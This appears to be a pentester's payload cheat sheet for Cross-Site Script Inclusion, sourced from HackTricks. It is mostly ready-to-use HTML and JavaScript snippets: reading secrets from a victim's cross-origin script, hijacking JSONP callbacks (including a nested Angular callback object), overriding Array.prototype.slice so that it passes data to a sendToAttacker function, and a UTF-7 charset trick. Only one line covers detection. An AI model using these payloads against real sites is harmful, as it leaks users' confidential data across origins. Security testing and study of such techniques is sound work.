---
title: "Payloads: XSSI"
type: payloads
tags: [payloads, xssi, jsonp, information-disclosure, web]
sources: [hacktricks-web]
date_created: 2026-07-14
date_updated: 2026-07-21
---

# Payloads: XSSI

Cross-Site Script Inclusion leak primitives (JSONP callback hijack + non-script leak). See [[techniques/web/xssi]].

## Regular XSSI (secret in a global var of a cross-origin script)
```html
<script src="https://victim.tld/script.js"></script>
<script>alert(JSON.stringify(confidential_keys[0]))</script>
```

## JSONP callback hijack (define the callback before including)
```html
<script>function leak(x){alert(JSON.stringify(x))}</script>
<script src="https://victim.tld/p?jsonp=leak"></script>
<!-- nested callback object -->
<script>var angular=function(){};angular.callbacks={};
angular.callbacks._7=function(x){alert(JSON.stringify(x))}</script>
<script src="https://victim.tld/p?jsonp=angular.callbacks._7"></script>
```

## Prototype tampering to leak non-global vars
```javascript
Array.prototype.slice = function(){ sendToAttacker(this) }  // leaks the sliced array
```

## Non-script XSSI (UTF-7-encoded JSON escaping to script)
```html
<script src="http://victim.tld/data.json" charset="UTF-7"></script>
```

Detect dynamic-JS XSSI: diff endpoint response with vs without cookies (Burp DetectDynamicJS).

Source: HackTricks (pentesting-web)
